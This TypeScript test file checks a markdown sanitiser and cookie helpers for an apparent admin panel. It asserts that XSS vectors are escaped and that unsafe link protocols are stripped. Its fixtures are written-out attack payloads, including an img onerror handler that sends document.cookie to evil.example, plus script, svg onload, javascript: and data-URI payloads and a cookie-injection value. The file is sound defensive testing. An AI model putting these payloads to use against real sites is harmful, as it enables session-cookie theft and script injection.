import assert from 'node:assert/strict'
import test from 'node:test'
import { buildCookieString, parseCookieHeader } from '../src/lib/cookies.ts'
import { renderSafeMarkdown } from '../src/lib/markdown.ts'

test('renderSafeMarkdown 转义内联 HTML 与事件处理器，阻断存储型 XSS', () => {
  const malicious = [
    '# 教程标题',
    '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">',
    '<script>window.__pwned = true</script>',
    '<svg onload="alert(1)"></svg>',
    '**正常加粗**',
  ].join('\n\n')

  const html = renderSafeMarkdown(malicious)

  assert.match(html, /<h1>教程标题<\/h1>/)
  assert.match(html, /<strong>正常加粗<\/strong>/)
  assert.doesNotMatch(html, /<script\b/i)
  assert.doesNotMatch(html, /<svg\b/i)
  assert.doesNotMatch(html, /<img\b[^>]*onerror/i)
  assert.match(html, /&lt;img src=x onerror=/)
  assert.match(html, /&lt;script&gt;/)
})

test('renderSafeMarkdown 拒绝危险链接协议但保留安全链接与相对路径', () => {
  const input = [
    '[js](javascript:alert(1))',
    '[vb](vbscript:msgbox(1))',
    '![svg](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)',
    '[proto-rel](//evil.example/payload)',
    '[https](https://example.com/docs)',
    '[mailto](mailto:support@example.com)',
    '[relative](/knowledge/1#faq)',
  ].join('\n\n')

  const html = renderSafeMarkdown(input)

  assert.doesNotMatch(html, /href="javascript:/i)
  assert.doesNotMatch(html, /href="vbscript:/i)
  assert.doesNotMatch(html, /src="data:image\/svg\+xml/i)
  assert.doesNotMatch(html, /href="\/\/evil\.example/i)
  assert.match(html, /href="https:\/\/example\.com\/docs"/)
  assert.match(html, /href="mailto:support@example\.com"/)
  assert.match(html, /href="\/knowledge\/1#faq"/)
})

test('buildCookieString 写入 SameSite=Lax、按 HTTPS 附加 Secure 并编码特殊字符', () => {
  const tokenPayload = JSON.stringify('Bearer abc; evil=1')

  const httpCookie = buildCookieString('xboard_admin_token', tokenPayload, 3600, false)
  assert.match(httpCookie, /^xboard_admin_token=%22Bearer%20abc%3B%20evil%3D1%22; path=\/; max-age=3600; SameSite=Lax$/)
  assert.doesNotMatch(httpCookie, /;\s*Secure\b/)

  const httpsCookie = buildCookieString('xboard_admin_token', tokenPayload, 3600, true)
  assert.match(httpsCookie, /; SameSite=Lax; Secure$/)

  const cleared = buildCookieString('xboard_admin_token', 'ignored', 0, true)
  assert.equal(
    cleared,
    'xboard_admin_token=; path=/; max-age=0; SameSite=Lax; Secure'
  )
})

test('parseCookieHeader 同时支持编码新值并向后兼容历史未编码 JSON Cookie', () => {
  const encodedUser = encodeURIComponent(
    JSON.stringify({ email: 'admin@example.com;role=owner', is_admin: true })
  )
  const headerWithEncoded = `theme=dark; xboard_admin_user=${encodedUser}; sidebar_state=true`
  assert.deepEqual(
    JSON.parse(parseCookieHeader(headerWithEncoded, 'xboard_admin_user')),
    { email: 'admin@example.com;role=owner', is_admin: true }
  )

  // 历史未编码 Cookie（含裸引号及畸形百分号）仍可无损读取
  const legacyHeader =
    'xboard_admin_token="Bearer plain_token_100%"; theme=light'
  assert.equal(
    JSON.parse(parseCookieHeader(legacyHeader, 'xboard_admin_token')),
    'Bearer plain_token_100%'
  )

  // 历史未编码 JSON 中包含合法 %XX 序列（如 team%41@example.test）不得被误解码改写
  const legacyPercentUser =
    'xboard_admin_user={"email":"team%41@example.test","is_admin":true}'
  assert.deepEqual(
    JSON.parse(parseCookieHeader(legacyPercentUser, 'xboard_admin_user')),
    { email: 'team%41@example.test', is_admin: true }
  )
})
